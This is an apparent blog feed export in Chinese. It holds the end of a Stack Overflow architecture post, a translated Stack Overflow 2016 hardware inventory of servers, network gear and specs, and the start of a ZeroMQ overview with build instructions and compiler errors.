<p>一个有趣的事实：其中一些浏览器已经打开超过 18 个月了。Someone should go check if those developers are still alive！！</p>
<p>问题：临时端口、负载均衡上的文件句柄耗尽，都是非常有趣的问题，我们稍后会提到它们。</p>
<h4 id="Search搜索"><a href="#Search搜索" class="headerlink" title="Search搜索"></a>Search搜索</h4><p>Elasticsearch集群，每个ES集群都有3个Node<br>什么不用Solr？我们需要在整个网络中进行搜索（同时有多个索引），在我们进行决策的时候 Solr 还不支持这种场景。</p>
<p>还没有使用 2.x 版本的原因，是因为2.x 版本中类型（types）有了很大的变化，这意味着想要升级的话我们得重新索引所有内容。</p>
<p>没有足够的时间来制定需求变更和迁移的计划。</p>
<h4 id="Database数据库"><a href="#Database数据库" class="headerlink" title="Database数据库"></a>Database数据库</h4><p>SQLServer<br>Our usage of SQL is pretty simple. Simple is fast.</p>
<p>数据库中只有一个存储过程，而且我打算把这个最后残留的存储过程也干掉，换成代码。</p>
<h4 id="监控系统"><a href="#监控系统" class="headerlink" title="监控系统"></a>监控系统</h4><p>Opserver：轻量级监控系统，基于 asp.net MVC 框架，可监控：<br>Servers</p>
<p>SQL clusters/instances</p>
<p>redis</p>
<p>elastic search</p>
<p>exception logs</p>
<p>haproxy</p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/SO-Architecture-Opserver-HAProxy.png" alt=""></p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/SO-Architecture-Opserver-DBTier.png" alt=""><br><img src="http://riboseyim-qiniu.riboseyim.com/SO-Architecture-Opserver-WebTier.png" alt=""></p>
<p>数据库CPU very low</p>
<h1 id="Stack-Overflow-The-Hardware-2016-Edition"><a href="#Stack-Overflow-The-Hardware-2016-Edition" class="headerlink" title="Stack Overflow: The Hardware - 2016 Edition"></a>Stack Overflow: The Hardware - 2016 Edition</h1><p>这是关于Stack Overflow架构的一系列文章中的第二篇。<br>前一篇：《 Stack Overflow: 架构》（2016版）<br>后一篇：《 Stack Overflow: 我们是如何做部署的》（2016版）</p>
<p>有人对硬件感兴趣吗？好吧，我感兴趣，这篇博客就是关于这个话题，所以，我赢了。如果你不关系硬件，那么可以走开并关闭浏览器了。还在这儿吗？真棒。<br>假如你的网页访问非常非常慢，在这种情况下，你应该考虑采购一些新的硬件。</p>
<p>我曾今反复重申过多次：性能是一个重要组件。<br>特别是当你的代码必须在最快的硬件上运行，硬件的关系则越为重大。正如任何其它的平台，Stack Overflow的架构是分层的。硬件对我们来说属于基础层，它有自己的屋子，在很多情况下，对我们来说，它的许多关键组件是不可控的。。。就像运行在别人的服务器。它也伴随着直接和间接的成本。但是，这些不是本篇文章的重点，这方面的对比将于稍后报告。目前来说，我希望能提供一份详细的，关于我们基础设施的清单，用于大家参考和比较。</p>
<p>服务器照片。有时是裸设备。<br>这个网页可以加载得更快，但是我不能自禁。（言归正传）<br>在这个系列报告中我将提供大量数字和规格说明。<br>当我说“我们的SQL Server CPU利用率接近5-10%，” 好吧，这非常棒。<br>但是，5-10% 的什么？ 这时我们需要一个参考值。这份硬件清单可以回答这些问题，并且座位与其它平台比较的依据，利用率对比如何，容量对比如何，等等。</p>
<h3 id="How-We-Do-Hardware"><a href="#How-We-Do-Hardware" class="headerlink" title="How We Do Hardware"></a>How We Do Hardware</h3><p>免责声明：我不是一个人干的。</p>
<p>George Beech (@GABeech) 是我的主要搭档，盘点管控Stack使用的硬件。<br>我们小心地规范每一台服务器，以使它符合设计意图。 我们不会只管下订单、分派任务。在这个过程中我们也不会自己单独完成；你必须知道将来这些硬件需要运行什么东西，才能做出合适的选择。我们将和开发工程师或者其他的可靠性工程师一道，为运行在盒子上的应用选择最佳方案。我们也关注在整个系统中什么才是最好的。每一台服务器都不是孤岛。如何将它嵌入到总体的架构中去，确实需要好好考量。哪些服务可以全平台共享？数据中心？日志系统？管理更少的事情，或者至少做到更少的差异，这件事本身就具有内在的价值。</p>
<p>当我们盘点硬件的时候，我们列出了很多规则来帮助我们厘清哪些是需要提供的。<br>我还从没有真正写下这些心里面的检查表，简短来说：</p>
<ul>
<li>这是一个升级或降级的问题吗？（我们购买一个更大的机器，或者一些更小的？</li>
<li>我们需要／希望做到什么程度的冗余? (多少预留空间和故障恢复能力?)</li>
<li><strong>存储:</strong></li>
<li>服务器／应用需要挂在磁盘吗？(我们是否需要Spinny操作系统驱动?)</li>
<li>如果是，需要多少？（多大的网络带宽？有多少小文件？是否需要固态硬盘？）</li>
<li>如果是SSD（固态硬盘），是否写负载？（我们讨论 Intel S3500/3700s? P360x? P3700s?)</li>
<li>我们需要多少SSD容量? (是否可以采用同时搭载HDD（机械硬盘）的双轮方案?)</li>
<li>数据是否需要完全缓存？（相比没有电容器的SSD，哪一种更便宜，哪种更合适？）</li>
<li>将来存储是否需要扩展? (我们采用1U/10-bay 服务器, 或者一个 2U/26-bay 服务器?)</li>
<li>这是一个数据仓库的场景设定吗？（我们是否考虑3.5’’驱动器？如果是，每个2U主板上是12个还是16个驱动器？）</li>
<li>对于3.5’’的后板来说，存储平衡在在处理器上是否能达到 120W TDP 的限制?</li>
<li>我们是否需要直接显示磁盘？（控制器是否需要支持pass-through?)</li>
<li><strong>内存:</strong></li>
<li>它需要多少内存？（我们必须买什么？）</li>
<li>它将会使用多少内存？（我们最好买什么？）</li>
<li>我们是否认为它稍后需要更多的内存？（我们应该搭配那种内存频率？）</li>
<li>它是一个内存消耗型应用程序吗？（我们是否想要达到最大主频？）</li>
<li>它是一个高并发的应用程序吗？（一定空间的情况下，我们是否想要通过更多的DIMM来分摊内存？）</li>
<li><strong>CPU:</strong></li>
<li>我们希望采用哪种类型的处理器？（我们需要CPU自己供电还是独立电源？）</li>
<li>它是高并发的应用程序吗？（我们希望采用更少、更快的内核？或者，采用数量更多，更慢的内核？）</li>
<li>以下哪种情况？是否存在大量的二级和三级缓存竞争？（为了提高性能，我们是否需要一个巨大的三级缓存？）</li>
<li>应用瓶颈主要是单一内核吗？（我们是否采用最大主频？）</li>
<li>如果是这样的话，同时需要支持多少进程数？（这里我们希望采用哪种引擎？）</li>
<li><strong>网络:</strong></li>
<li>我们是否需要增加 10Gb 网络连接？（此处是否为透传设备，例如一个负载均衡器？）</li>
<li><p>我们需要怎样的出／入流量均衡策略？（哪个CPU内核负责计算均衡权重？）</p>
</li>
<li><p><strong>冗余:</strong></p>
</li>
<li>我们在数据缓存中心是否也需要服务器？</li>
<li>我们是否需要在同等数量的情况下，接受更低的冗余要求？</li>
<li>我们是否需要一个电源线？不。我们不需要。</li>
</ul>
<p>现在，让我们来看看服务网站的都有哪些硬件，它们位于纽约 （New York）QTS 数据中心。实际上，它位于新泽西（New Jersey)，但是让我们保持这个约定。为什么我们称之为NY数据中心？因为我们不想重命名所有以NY-开头的服务器。（What ?!…）我将记录在下面的清单上，丹佛的情况，在规格和冗余级别上略有差别。</p>
<p>Hide Pictures (in case you’re using this as a hardware reference list later)</p>
<h3 id="Stack-Overflow-amp-Stack-Exchange-站点服务器"><a href="#Stack-Overflow-amp-Stack-Exchange-站点服务器" class="headerlink" title="Stack Overflow &amp; Stack Exchange 站点服务器"></a>Stack Overflow &amp; Stack Exchange 站点服务器</h3><h4 id="纽约数据中心"><a href="#纽约数据中心" class="headerlink" title="纽约数据中心"></a>纽约数据中心</h4><p><strong>全局选项</strong><br>先说明一些全局配置，在下面每台服务器的介绍里就不重复了：</p>
<ul>
<li>除非有特殊需要，不包含操作系统驱动。大多数服务器使用一对250 或者 500 GB SATA HDD 硬盘 ，用于操作系统，通常是 RAID 1。我们不担心启动时间问题，所有物理服务器，启动时间中的大部分不依赖驱动的速度（例如，检查768GB内存）。</li>
<li>所有服务器通过2个或以上10Gb网络链路连接，通过双活LACP协议。</li>
<li>所有服务器运行在208V 单相功率电源 (经由2个PSU ，来自2个PDU-双电源).</li>
<li>在纽约的所有服务器由缆线臂，在丹佛的服务器则没有（主要依靠本地工程师）。</li>
<li>所有服务器都有一个iDRAC连接 (经由管理网络) 和一个KVM连接。</li>
</ul>
<p><strong>网络</strong></p>
<ul>
<li>2x Cisco Nexus 5596UP 核心交换机 (96 SFP+ 端口，每个端口 10 Gbps)</li>
<li>10x Cisco Nexus 2232TM Fabric Extenders (2 per rack - each has 32 BASE-T ports each at 10Gbps + 8 SFP+ 10Gbps 上联链路)</li>
<li>2x Fortinet 800C 防火墙</li>
<li>2x Cisco ASR-1001 路由器</li>
<li>2x Cisco ASR-1001-x 路由器</li>
<li>6x Cisco 2960S-48TS-L 网管交换机 (1 Per Rack - 48 1Gbps ports + 4 SFP 1Gbps)</li>
<li>1x Dell DMPU4032 KVM</li>
<li>7x Dell DAV2216 KVM Aggregators (1–2 per rack - each uplinks to the DPMU4032)</li>
</ul>
<p>原作者备注: 每个 FEX 到核心 拥有 80 Gbps 上联带宽 ，核心通过一个160 Gbps端口通道与它们连接。由于最近的一些工程，我们位于丹佛数据中心的硬件会更新一些。所有4 台路由器的型号是 ASR-1001-x 和 双核 Cisco Nexus 56128P,每个都拥有96 SFP+ 10Gbps 端口 和 8 QSFP+ 40Gbps 端口。这些节省下来的端口，可以用于未来扩展，我们可以为核心绑定4x 40Gbps链接，替代每个 16x10Gbps端口的方案，正如我们在纽约做的那样。这些就是纽约的网络设备情况:</p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/SO-Hardware-Network-NewYork-Fiber-Small.jpg" alt="SO-Hardware-Network-NewYork-Fiber-Small.jpg"><br><img src="http://riboseyim-qiniu.riboseyim.com/SO-Hardware-Network-NewYork-Fortinet-Small.jpg" alt="SO-Hardware-Network-NewYork-Fortinet-Small.jpg"><br><img src="http://riboseyim-qiniu.riboseyim.com/SO-Hardware-Network-NewYork-Rack-Small.jpg" alt="SO-Hardware-Network-NewYork-Rack-Small.jpg"></p>
<h4 id="丹佛数据中心"><a href="#丹佛数据中心" class="headerlink" title="丹佛数据中心"></a>丹佛数据中心</h4><p>这里需要提到的是Mark Henderson, 我们网站的可靠性工程师之一，专程到纽约数据中心为我的这份报告拿到了一些高分辨率的照片。<br><img src="http://riboseyim-qiniu.riboseyim.com/SO-Hardware-Network-Denver-Installed-Small.jpg" alt="SO-Hardware-Network-Denver-Installed-Small.jpg"><br><img src="http://riboseyim-qiniu.riboseyim.com/SO-Hardware-Network-Denver-Racked-Small.jpg" alt="SO-Hardware-Network-Denver-Racked-Small.jpg"><br><img src="http://riboseyim-qiniu.riboseyim.com/SO-Hardware-Network-Denver-Raw-Small.jpg" alt="SO-Hardware-Network-Denver-Raw-Small.jpg"></p>
<p><strong>SQL Servers (Stack Overflow 集群)</strong></p>
<ul>
<li>2 Dell R720xd 服务器，每台配置如下:</li>
<li>双 E5-2697v2 处理器 (每个 12 核 @2.7–3.5GHz)</li>
<li>384 GB of RAM (24x 16 GB DIMMs)</li>
<li>1x Intel P3608 4 TB NVMe PCIe SSD (RAID 0, 2块卡上两个控制器)</li>
<li>24x Intel 710 200 GB SATA SSDs (RAID 10)</li>
<li>双 10 Gbps 网络 (Intel X540/I350 NDC)<br><strong>SQL Servers (Stack Exchange 及其它业务集群)</strong></li>
<li>2 Dell R730xd Servers, each with:</li>
<li>双 E5-2667v3 处理器 (每个8 核 @3.2–3.6GHz)</li>
<li>768 GB of RAM (24x 32 GB DIMMs)</li>
<li>3x Intel P3700 2 TB NVMe PCIe SSD (RAID 0)</li>
<li>24x 10K Spinny 1.2 TB SATA HDDs (RAID 10)</li>
<li>双 10 Gbps 网络 (Intel X540/I350 NDC)<br>原作者备注: 丹佛的SQL硬件在规格上相同，对应纽约部分这里只有一个 SQL 服务器<br>这是二月份为纽约的SQL Server 升级PCIe SSD的情形：</li>
</ul>
<p><img src="http://riboseyim-qiniu.riboseyim.com/SO-Hardware-SQL-Front-Small.jpg" alt="SO-Hardware-SQL-Front-Small.jpg"><br><img src="http://riboseyim-qiniu.riboseyim.com/SO-Hardware-SQL-Inside-Small.jpg" alt="SO-Hardware-SQL-Inside-Small.jpg"><br><img src="http://riboseyim-qiniu.riboseyim.com/SO-Hardware-SQL-SSDs-Small.jpg" alt="SO-Hardware-SQL-SSDs-Small.jpg"><br><img src="http://riboseyim-qiniu.riboseyim.com/SO-Hardware-SQL-Top-Small.jpg" alt="SO-Hardware-SQL-Top-Small.jpg"></p>
<p><strong>Web 服务器</strong></p>
<ul>
<li>11 Dell R630 服务器，每台配置如下:</li>
<li>双 E5-2690v3 处理器 (每个12 核 @2.6–3.5GHz)</li>
<li>64 GB of RAM (8x 8 GB DIMMs)</li>
<li>2x Intel 320 300GB SATA SSDs (RAID 1)</li>
<li>双 10 Gbps 网络 (Intel X540/I350 NDC)</li>
</ul>
<p><strong>应用服务器 (Workers)</strong></p>
<ul>
<li>2 Dell R630 服务器, 每台配置如下:</li>
<li>双 E5-2643 v3 处理器(每个 6 核 @3.4–3.7GHz)</li>
<li>64 GB of RAM (8x 8 GB DIMMs)</li>
<li>1 Dell R620 服务器,配置如下:</li>
<li>双 E5-2667 处理器 (每个6 核 @2.9–3.5GHz)</li>
<li>32 GB of RAM (8x 4 GB DIMMs)</li>
<li>2x Intel 320 300GB SATA SSDs (RAID 1)</li>
<li>双 10 Gbps 网络 (Intel X540/I350 NDC)</li>
</ul>
<p><img src="http://riboseyim-qiniu.riboseyim.com/SO-Hardware-Web-Tier-Back-Small.jpg" alt="SO-Hardware-Web-Tier-Back-Small.jpg"><br><img src="http://riboseyim-qiniu.riboseyim.com/SO-Hardware-Web-Tier-Front-Small.jpg" alt="SO-Hardware-Web-Tier-Front-Small.jpg"><br><img src="http://riboseyim-qiniu.riboseyim.com/SO-Hardware-Web-Tier-Front2-Small.jpg" alt="SO-Hardware-Web-Tier-Front2-Small.jpg"><br><img src="http://riboseyim-qiniu.riboseyim.com/SO-Hardware-Web-Tier-Unboxed-Small.jpg" alt="SO-Hardware-Web-Tier-Unboxed-Small.jpg"></p>
<p>原作者备注: NY-SERVICE03 目前仍然是一台 R620, 但是现在并没有足够老到以至于需要更换。它会在今年晚些时候升级。</p>
<p><strong>Redis 服务器 (缓存)</strong></p>
<ul>
<li>2 Dell R630 服务器, 每台配置如下:</li>
<li>双 E5-2687W v3 处理器 (每个10 核 @3.1–3.5GHz)</li>
<li>256 GB of RAM (16x 16 GB DIMMs)</li>
<li>2x Intel 520 240GB SATA SSDs (RAID 1)</li>
<li>双 10 Gbps 网络 (Intel X540/I350 NDC)</li>
</ul>
<p><strong>Elasticsearch 服务器 (检索)</strong></p>
<ul>
<li>3 Dell R620 服务器, 每台配置如下:</li>
<li>双 E5-2680 处理器 (每个8 核 @2.7–3.5GHz)</li>
<li>192 GB of RAM (12x 16 GB DIMMs)</li>
<li>2x Intel S3500 800GB SATA SSDs (RAID 1)</li>
<li>双 10 Gbps 网络 (Intel X540/I350 NDC)</li>
</ul>
<p><strong>HAProxy 服务器 (负载均衡器)</strong></p>
<ul>
<li>2 Dell R620 服务器 (流量来源CloudFlare), 每台配置如下:</li>
<li>双 E5-2637 v2 处理器 (每个4 核 @3.5–3.8GHz)</li>
<li>192 GB of RAM (12x 16 GB DIMMs)</li>
<li>6x Seagate Constellation 7200RPM 1TB SATA HDDs (RAID 10) (日志)</li>
<li>双 10 Gbps 网络 (Intel X540/I350 NDC) - (DMZ)内网流量</li>
<li>双 10 Gbps 网络 (Intel X540) - 外网流量</li>
<li>2 Dell R620 服务器 (直达流量), 每台配置如下:</li>
<li>双 E5-2650 处理器 (每个 8 核 @2.0–2.8GHz each)</li>
<li>64 GB of RAM (4x 16 GB DIMMs)</li>
<li>2x Seagate Constellation 7200RPM 1TB SATA HDDs (RAID 10) (日志)</li>
<li>双 10 Gbps 网络 (Intel X540/I350 NDC) - (DMZ) 外网流量</li>
<li>双 10 Gbps 网络 (Intel X540) - 外网流量</li>
</ul>
<p>原作者备注: 这些服务器是不同时期采购的，因此规格上略有差异。并且，2台CloudFlare负载均衡器因为安装了memcached,拥有更多内存（我们现在已经不运行该组件）。这些服务，redis, 检索,和负载均衡器在stack都是基于1U 服务器。<br>这是纽约的情况：</p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/SO-Hardware-Redis-Inside-Small.jpg" alt="SO-Hardware-Redis-Inside-Small.jpg"><br><img src="http://riboseyim-qiniu.riboseyim.com/SO-Hardware-Service-Inside-Small.jpg" alt="SO-Hardware-Service-Inside-Small.jpg"><br><img src="http://riboseyim-qiniu.riboseyim.com/SO-Hardware-Service-Rear-Small.jpg" alt="SO-Hardware-Service-Rear-Small.jpg"><br><img src="http://riboseyim-qiniu.riboseyim.com/SO-Hardware-Redis-Search-Front-Small.jpg" alt="SO-Hardware-Service-Redis-Search-Front-Small.jpg"></p>
<h3 id="其它服务器"><a href="#其它服务器" class="headerlink" title="其它服务器"></a>其它服务器</h3><p>我们还有一些其他的服务器并不直接或间接服务于网站的流量。<br>它们负责处理一些相关业务（例如，域名控制器，少量用于应用验证，跑在虚拟机上），或者一些次要的采购用于监控，日志存储，备份等等。既然已经表示未来会做一系列的报告，我把一切有趣的“后台”服务器也列出来。使我可以将更多的服务器拿出来和你分享，有人不喜欢的吗？</p>
<p><strong>VM 服务器 (VMWare, 当前)</strong></p>
<ul>
<li>2 Dell FX2s Blade Chassis, each with 2 of 4 blades populated</li>
<li>4 Dell FC630 Blade Servers (2 per chassis), each with:</li>
<li>双 E5-2698 v3 处理器 (每个16 核 @2.3–3.6GHz)</li>
<li>768 GB of RAM (24x 32 GB DIMMs)</li>
<li>2x 16GB SD Cards (Hypervisor - no local storage)</li>
<li>双 4x 10 Gbps 网络 (FX IOAs - BASET)</li>
<li>1 EqualLogic PS6210X iSCSI SAN</li>
<li>24x Dell 10K RPM 1.2TB SAS HDDs (RAID10)</li>
<li>双 10Gb 网络 (10-BASET)</li>
<li>1 EqualLogic PS6110X iSCSI SAN</li>
<li>24x Dell 10K RPM 900GB SAS HDDs (RAID10)</li>
<li>双 10Gb 网络 (SFP+)</li>
</ul>
<p><img src="http://riboseyim-qiniu.riboseyim.com/SO-Hardware-VMs-Blades-Small.jpg" alt="SO-Hardware-VMs-Blades-Small.jpg"><br><img src="http://riboseyim-qiniu.riboseyim.com/SO-Hardware-VMs-Blades2-Small.jpg" alt="SO-Hardware-VMs-Blades2-Small.jpg"><br><img src="http://riboseyim-qiniu.riboseyim.com/SO-Hardware-VMs-Front-Small.jpg" alt="SO-Hardware-VMs-Front-Small.jpg"><br><img src="http://riboseyim-qiniu.riboseyim.com/SO-Hardware-VMs-Rear-Small.jpg" alt="SO-Hardware-VMs-Rear-Small.jpg"></p>
<p>在一些场景下，还有几台重要的服务器不是虚拟机。这些系统后台任务，帮助我们通过日志追踪排查问题，存储大量的数据等等。</p>
<p><strong>机器学习服务器 (Providence)</strong><br>这些服务器99%的时间是空闲的，但是每晚承担了大量的处理工作：刷新Providence。它们也可以通过内部数据中心的方式，用来测试基于海量数据的新算法。</p>
<ul>
<li>2 Dell R620 服务器, 每台配置如下:</li>
<li>双 E5-2697 v2 处理器 (每个 12 核 @2.7–3.5GHz)</li>
<li>384 GB of RAM (24x 16 GB DIMMs)</li>
<li>4x Intel 530 480GB SATA SSDs (RAID 10)</li>
<li>双 10 Gbps 网络 (Intel X540/I350 NDC)</li>
</ul>
<p>译者注：Providence，应为项目代号。Providence通过分析流量日志，给网站的访问用户打标签 (类似“web开发者” 或者 “使用Java技术栈”)  。详细可以查阅[<a href="https://kevinmontrose.com/2015/01/27/providence-machine-learning-at-stack-exchange/">https://kevinmontrose.com/2015/01/27/providence-machine-learning-at-stack-exchange/</a>]</p>
<p><strong>机器学习服务器－Redis (Still Providence)</strong><br>这是一个为 Providence服务的redis数据集。它们通常是一台主用，一台备用，还有一个实例是用于测试，如最新版的ML算法。当它不用做Q&amp;A站点时，这些数据会服务于职位招聘的边栏广告。</p>
<ul>
<li>3 Dell R720xd 服务器,每台配置如下:</li>
<li>Dual E5-2650 v2 Processors (8 cores @2.6–3.4GHz each)</li>
<li>384 GB of RAM (24x 16 GB DIMMs)</li>
<li>4x Samsung 840 Pro 480 GB SATA SSDs (RAID 10)</li>
<li>Dual 10 Gbps network (Intel X540/I350 NDC)</li>
</ul>
<p><strong>日志服务器(各种日志）</strong><br>我们的 Logstash 集群 (使用 Elasticsearch 存储) ，数据来源于，任何地方。<br>我们曾计划将HTTP日志复制一份到这些服务器，但是由于影响性能的问题而没有实现。尽管如此，我们还是将所有的网络设备日志，syslog，Windows和Linux系统日志存在这里，所以我们能够建立建立一个网络的全局视图，或者快速地排查问题。当告警发生的时候，它也被用作Bosun的一个数据源。这个集群总计使用的存储是 6x12x4 = 288 TB。</p>
<ul>
<li>6 Dell R720xd 服务器, 每台配置如下:</li>
<li>Dual E5-2660 v2 Processors (10 cores @2.2–3.0GHz each)</li>
<li>192 GB of RAM (12x 16 GB DIMMs)</li>
<li>12x 7200 RPM Spinny 4 TB SATA HDDs (RAID 0 x3 - 4 drives per)</li>
<li>双 10 Gbps 网络 (Intel X540/I350 NDC)</li>
</ul>
<p><strong> SQL Server－HTTP日志 </strong><br>在这些服务器，我们将访问负载均衡器的单独HTTP请求，存储到SQL数据库(来源于HAProxy syslog）。我们只记录少数高级别的请求，类似URL，查询，UserAgent,SQL执行时间，Redis，等等。在这里的数据，每天将进入一个集群的Columnstore 索引。我们借助这些数据排查用户的问题，发现僵尸网络，等等。</p>
<ul>
<li>1 Dell R730xd 服务器，配置如下:</li>
<li>双 E5-2660 v3 处理器 (每个10 核 @2.6–3.3GHz)</li>
<li>256 GB of RAM (16x 16 GB DIMMs)</li>
<li>2x Intel P3600 2 TB NVMe PCIe SSD (RAID 0)</li>
<li>16x Seagate ST6000NM0024 7200RPM Spinny 6 TB SATA HDDs (RAID 10)</li>
<li>双 10 Gbps 网络 (Intel X540/I350 NDC)</li>
</ul>
<p><strong> SQL Server  - 开发 </strong><br>我们喜欢尽可能多地模拟生产环境，类似SQL匹配，额，至少是它过去常常发生的那样。们一直以来这购买升级生产处理器。我们会将升级这些服务器，采用2U 解决方案，在今年晚些升级Stack Overflow 集群的时候一起做。</p>
<ul>
<li>1 Dell R620 服务器，配置如下:</li>
<li>双 E5-2620 处理器 (每个6核 @2.0–2.5GHz)</li>
<li>384 GB of RAM (24x 16 GB DIMMs)</li>
<li>8x Intel S3700 800 GB SATA SSDs (RAID 10)</li>
<li>双 10 Gbps 网络 (Intel X540/I350 NDC)</li>
</ul>
<p>这些就是实际服务我们网站的硬件，或者说大家普遍感兴趣的部分。<br>我们当然还有其它服务器，用于后台任务，例如日志记录，监控，备份，等等。<br>如果你对于我们其它系统还有特别感兴趣的地方，请尽管留言提问，我很高兴回答。</p>
<p>这是一周多以前在纽约的全程：</p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/SO-Hardware-Racks-Small.jpg" alt="SO-Hardware-Racks-Small.jpg"><br><img src="http://riboseyim-qiniu.riboseyim.com/SO-Hardware-Racks2-Small.jpg" alt="SO-Hardware-Racks2-Small.jpg"></p>
<h3 id="接下来？"><a href="#接下来？" class="headerlink" title="接下来？"></a>接下来？</h3><p>我做的这一系列工作是希望能让社区了解到最多情况。<br>通过Trello board, 它让部署看起来像是下一个最有趣的话题。预计下一次将让大家了解代码是如何从开发者的机器到生产环境，以及这个过程中解决的所有问题。它将覆盖数据库迁移，滚动构建，CI 组件，我们如何建立开发环境，所有要素如何共享信息等。</p>
<h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><ul>
<li><a href="https://medium.com/refraction-tech-everything/how-netflix-works-the-hugely-simplified-complex-stuff-that-happens-every-time-you-hit-play-3a40c9be254b">How Netflix works: the (hugely simplified) complex stuff that happens every time you hit Play</a></li>
</ul>
]]></content>
      <categories>
        <category>工程技术</category>
      </categories>
      <tags>
        <tag>SRE</tag>
        <tag>DevOps</tag>
        <tag>Linux</tag>
        <tag>Engineering</tag>
        <tag>网络协议</tag>
      </tags>
  </entry>
  <entry>
    <title>开源技术架构漫谈：消息中间件(ZeroMQ)</title>
    <url>/2016/04/26/OpenSource-ZeroMQ/</url>
    <content><![CDATA[<h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h2><blockquote>
<p>ZeroMQ (also known as ØMQ, 0MQ, or zmq) is an networking library, acts like a concurrency framework。<a href="https://github.com/zeromq-cn" target="_blank" rel="noopener">https://github.com/zeromq-cn</a></p>
<p>缘起</p>
</blockquote>
<p>first time I knew:<a href="http://www.jianshu.com/p/f10a2d862863" target="_blank" rel="noopener">Ntopng</a></p>
<a id="more"></a>
<h4 id="发起人：Pieter-Hintjens"><a href="#发起人：Pieter-Hintjens" class="headerlink" title="发起人：Pieter Hintjens"></a>发起人：Pieter Hintjens</h4><p>iMatix公司首席执行官，制作游戏视频游戏起家。Wikidot公司前CEO。数字标准组织创始人。曾任FFII（自由信息基础设施基金会）会长，与软件专利斗争的大型NGO组织。会说英语、法语、荷兰语。生活在比利时布鲁塞尔，组织西非鼓乐队，喜欢旅行。一个C内核及C＋＋编写的核心库libzmq，50余种语言支持的绑定程序(例如Python支持PyZMQ)。由绑定程序的作者组成维护小组，iMatix公司持有商标，提供商业支持。</p>
<h2 id="架构哲学"><a href="#架构哲学" class="headerlink" title="架构哲学"></a>架构哲学</h2><p>零代理，零延迟，零管理，零成本，也代表贯穿项目的简约文化。<br>软件的真正本质是人的本质，我们人类真的不善于理解复杂性，并且我们真的善于用合作来对大问题分而治之。我们是高度社会化的类人猿，有点聪明，但只在合适的人群中。</p>
<p>请把架构视为一个市场，而不是一个工程设计。－－《来自ZeroMQ的软件架构哲学》</p>
<h4 id="Repository"><a href="#Repository" class="headerlink" title="Repository"></a>Repository</h4><ul>
<li><a href="http://zeromq.org/" target="_blank" rel="noopener">http://zeromq.org/</a>   </li>
</ul>
<h4 id="Application"><a href="#Application" class="headerlink" title="Application"></a>Application</h4><p><img src="http://riboseyim-qiniu.riboseyim.com/theme_opensource_zeromq.png" alt></p>
<ul>
<li>Ntopng:Packet Capturing and Network Traffic Monitor</li>
<li><a href="https://riboseyim.github.io/2018/09/18/DevOps-Deployment-SaltStack" target="_blank" rel="noopener">SaltStack</a>:基础设施管理工具（Based Python）</li>
<li>Apache SINGA:分布式深度学习平台</li>
<li>微软DMTK:机器学习框架，ZMQ是进程通讯之一（2015-11-16 开源）</li>
<li>IPython Notebook<br>既是一个交互计算平台，又是一个记录计算过程的「笔记本」。它由服务端和客户端两部分组成，其中服务端负责代码的解释与计算，而客户端负责与用户进行交互。服务端可以运行在本机也可以运行在远程服务器，包含负责运算的 IPython kernel (与 QT Console 的 kernel 相同) 以及一个 HTTP/S 服务器 (Tornado)。而客户端则是一个指向服务端地址的浏览器页面，负责接受用户的输入并负责渲染输出。<a href="http://ipython.org/notebook.html" target="_blank" rel="noopener">http://ipython.org/notebook.html</a></li>
</ul>
<h4 id="ABC"><a href="#ABC" class="headerlink" title="ABC"></a>ABC</h4><p>Hello ZeroMQ</p>
<h4 id="Install"><a href="#Install" class="headerlink" title="Install"></a>Install</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> --depth=1 https://github.com/imatix/zguide.git</span><br><span class="line">./configure</span><br><span class="line">make</span><br><span class="line">make install</span><br></pre></td></tr></table></figure>
<h4 id="编译依赖项"><a href="#编译依赖项" class="headerlink" title="编译依赖项"></a>编译依赖项</h4><p><strong>libsodium-1.0.0</strong> (zeromq-4.1.2) </p>
<p>Github Issues:<a href="https://github.com/zeromq/libzmq/issues/1854" target="_blank" rel="noopener">zmq-4.1.2 make failed as libsodium-1.0.8 sodium_init #1854</a></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">cc1plus: warnings being treated as errors</span><br><span class="line">src/curve_client.cpp: In constructor</span><br><span class="line"></span><br><span class="line"><span class="string">'zmq::curve_client_t::curve_client_t(const zmq::options_t&amp;)'</span>:</span><br><span class="line">src/curve_client.cpp:61: warning: ignoring <span class="built_in">return</span> value of</span><br><span class="line"> <span class="string">'int sodium_init()'</span>,</span><br><span class="line">declared with attribute warn_unused_result</span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">//C Project 添加库</span><br><span class="line">gcc -L/usr/<span class="built_in">local</span>/lib -o <span class="string">"veto_mq_server"</span>  ./src/veto_mq_server.o  -lzmq</span><br></pre></td></tr></table></figure>
<p><strong>可能的异常：库路径、名称错误</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Undefined symbols <span class="keyword">for</span> architecture x86_64:</span><br><span class="line"><span class="string">"_zmq_bind"</span>, referenced from:</span><br><span class="line">_main <span class="keyword">in</span> veto_mq_server.o</span><br><span class="line"><span class="string">"_zmq_ctx_new"</span>, referenced from:</span><br><span class="line">_main <span class="keyword">in</span> veto_mq_server.o</span><br><span class="line"><span class="string">"_zmq_recv"</span>, referenced from:</span><br><span class="line">_main <span class="keyword">in</span> veto_mq_server.o</span><br><span class="line"><span class="string">"_zmq_send"</span>, referenced from:</span><br><span class="line">_main <span class="keyword">in</span> veto_mq_server.o</span><br><span class="line"><span class="string">"_zmq_socket"</span>, referenced from:</span><br><span class="line">_main <span class="keyword">in</span> veto_mq_server.o</span><br><span class="line">ld: symbol(s) not found <span class="keyword">for</span> architecture x86_64  </span><br><span class="line">clang: error: linker <span class="built_in">command</span> failed with <span class="built_in">exit</span> code 1 (use -v to see invocation)**</span><br></pre></td></tr></table></figure>
